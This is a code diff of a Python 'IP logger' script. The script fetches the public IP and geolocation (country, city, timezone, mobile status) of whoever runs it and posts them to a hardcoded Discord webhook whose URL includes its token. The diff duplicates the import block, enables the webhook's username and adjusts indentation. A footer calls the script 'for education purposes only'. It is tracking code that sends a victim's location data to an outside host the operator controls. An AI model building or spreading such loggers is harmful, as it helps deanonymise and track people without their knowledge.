@@ -786,6 +786,11 @@ import requests
 import public_ip as getip
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
+# Import requirements
+import requests
+import public_ip as getip
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
 # Get IP details
 publicip = getip.get()
 params = ["ip",'query', 'status', 'country', 'countryCode', 'city', 'timezone', 'mobile']
@@ -801,11 +806,11 @@ status = info['status']
 
 # Set the webhook
 webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1562597795666333778/xOCbGACPZbtBxXUXRMzwLtq5Cv7kQQR9-h92a4ZwkSnZFlrKYM7zpdzqg_I1rpKwoiJH", # Enter your Discord Webhook address
-                         #username="ASISAMKO IP LOGGER") # Enter Webhook name
+                         username="ASISAMKO IP LOGGER") # Enter Webhook name
 
 embed = DiscordEmbed(title="New IP Address Logged 👁️",
                     color = "e8734d",
-                   url="https://github.com/asisamko",)
+                    url="https://github.com/asisamko",)
 
 embed.set_author(name="",
                  url="https://github.com/asisamko",
@@ -828,7 +833,7 @@ embed.add_embed_field(name="🌐 Timezone:",
                 value=f"{timezone}",
                 inline=True)
 embed.add_embed_field(name="",
-               value=f"",
+                value=f"",
                 inline=True)
 embed.set_footer(text=f"For education purposes only!")
 embed.set_timestamp()
